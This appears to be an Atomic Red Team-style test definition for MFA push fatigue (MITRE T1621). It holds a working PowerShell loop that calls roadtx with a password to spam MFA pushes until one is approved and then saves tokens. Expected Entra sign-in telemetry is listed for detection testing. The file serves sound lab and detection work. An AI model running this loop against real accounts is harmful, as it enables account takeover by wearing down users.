attack_technique: T1621
display_name: "AiTM – MFA Push Fatigue (Repeated Authentication Requests)"
atomic_tests:
  - name: "MFA push spam via roadtx"
    auto_generated_guid: d4e5f6a7-b8c9-0123-defa-123456789003
    description: |
      Repeatedly attempts password-based authentication to trigger MFA push
      notifications, exhausting the victim until they approve. Wraps roadtx
      ROPC flow in a loop. In a lab this runs against a test account with a
      known password and MFA registered; the push is approved by the lab
      counterparty.
    supported_platforms:
      - windows
      - linux
      - macos
    input_arguments:
      tenant_id:
        description: "Entra tenant ID of the lab tenant."
        type: String
        default: "00000000-0000-0000-0000-000000000000"
      username:
        description: "Lab target UPN (must have MFA registered)."
        type: String
      password:
        description: "Lab account password."
        type: String
      client_id:
        description: "OAuth client ID supporting ROPC."
        type: String
        default: "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
      push_attempts:
        description: "Number of MFA push attempts before stopping."
        type: Integer
        default: "3"
      token_output_path:
        description: "Path to write the token cache if authentication succeeds."
        type: Path
        default: "#{token_cache_path}"
    executor:
      name: powershell
      command: |
        $attempts = #{push_attempts}
        $success  = $false
        for ($i = 1; $i -le $attempts; $i++) {
            Write-Host "MFA push attempt $i of $attempts..."
            $result = roadtx auth `
                --username '#{username}' `
                --password '#{password}' `
                --client '#{client_id}' `
                --tenant '#{tenant_id}' `
                --tokenfile '#{token_output_path}' 2>&1
            if ($LASTEXITCODE -eq 0) { $success = $true; break }
            Start-Sleep -Seconds 5
        }
        if (-not $success) {
            Write-Warning "MFA push fatigue: victim did not approve after $attempts attempts."
        }
    cleanup_command: |
      if (Test-Path -LiteralPath '#{token_output_path}') {
          Remove-Item -LiteralPath '#{token_output_path}' -Force
      }
    references:
      - "https://www.microsoft.com/en-us/security/blog/2022/10/26/microsoft-entra-expands-security-protections/"
    auth_profile: "mfa-fatigue"
    defense_evasion: "MFA bypass via push notification exhaustion; no AiTM proxy required"
    requires_token: false
    expected_telemetry:
      - source: entra_signin
        match:
          authenticationRequirement: "multiFactorAuthentication"
          status_failureReason: "MFA denied; user declined the request"
        within_minutes: 15
      - source: entra_signin
        match:
          authenticationRequirement: "multiFactorAuthentication"
          conditionalAccessStatus: "success"
        within_minutes: 20
    exercises_chokepoint:
      id: "DC-MFA-001"
      url: "https://detectionchokepoints.com/mfa/push-fatigue"
